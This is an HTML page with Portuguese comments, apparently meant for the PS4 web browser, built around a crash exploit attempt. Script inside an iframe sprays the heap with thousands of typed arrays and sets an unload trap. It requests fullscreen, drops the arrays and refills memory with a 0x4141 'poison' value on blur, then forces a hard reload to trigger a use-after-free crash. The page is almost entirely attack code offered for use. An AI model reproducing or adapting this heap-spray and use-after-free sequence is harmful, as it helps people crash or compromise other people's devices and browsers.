<!DOCTYPE html>
<html>
<head>
    <title>PS4 REFRESH REPLICATOR</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; }
        iframe { width: 90%; height: 350px; border: 4px solid #f00; background: #fff; margin: 20px auto; display: block;}
        button { padding: 20px 40px; font-size: 1.5em; cursor: pointer; background: #b00; color: white; border: 2px solid #fff; font-weight: bold; }
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #111; color: #0f0; }
    </style>
</head>
<body>

<h1>REFRESH BUTTON REPLICATOR</h1>
<h3>Técnica: Interceptação de Unload + Hard Reload</h3>

<iframe id="trigger_frame" srcdoc="
    <html>
    <body style='background:#400; color:#fff; text-align:center'>
        <h3>ZONA DO GATILHO</h3>
        <button onclick='startSequence()' style='padding:15px; background:red; color:white; font-weight:bold; border:2px solid white;'>
            INICIAR SEQUÊNCIA DE CRASH
        </button>
        <div id='status'>Pronto.</div>
        <script>
            var victims = [];
            var spray = [];
            const COUNT = 15000;
            const POISON = 2.121995791e-314; // 0x4141...

            function startSequence() {
                document.getElementById('status').innerText = '1. Alocando...';
                
                // 1. Setup Heap
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }

                // 2. ARMADILHA DE UNLOAD
                // Isso roda EXATAMENTE quando a página começa a atualizar/fechar
                window.onbeforeunload = function() {
                    // Tenta acessar a memória corrompida durante a destruição
                    // Isso força o crash se o sistema tentar ler arrays já liberados
                    try {
                        let access = victims[0][0]; 
                    } catch(e) {}
                    return null; // Não mostra popup, apenas executa
                };
                
                // 3. Fullscreen
                document.getElementById('status').innerText = '2. APERTE OPTIONS AGORA!';
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    // 4. O ATAQUE (UAF)
                    victims = null;
                    
                    // Spray Massivo
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(POISON);
                        spray.push(s);
                    }

                    document.getElementById('status').innerText = '3. FORÇANDO HARD RELOAD...';

                    // 5. SIMULAÇÃO DO BOTÃO ATUALIZAR
                    // setTimeout para sair da thread atual e deixar o spray assentar
                    setTimeout(function() {
                        // true = Força recarregamento do servidor (ignora cache)
                        // Isso é o mais próximo do botão 'Atualizar' nativo
                        window.location.reload(true);
                        
                        // Plano B: Se reload falhar, navegação destrutiva
                        window.location.href = '?crash=' + Date.now();
                    }, 100);
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema...</div>

<script>
    // Se o iframe morrer, avisamos
    setInterval(function(){
       let ifr = document.getElementById('trigger_frame');
       if(ifr) {
           try {
               // Tenta acessar o iframe para ver se está vivo
               let doc = ifr.contentDocument;
           } catch(e) {
               document.getElementById('log').innerHTML = '>> O Iframe parou de responder (Soft Lock ou Crash iminente).';
           }
       }
    }, 1000);
</script>

</body>
</html>
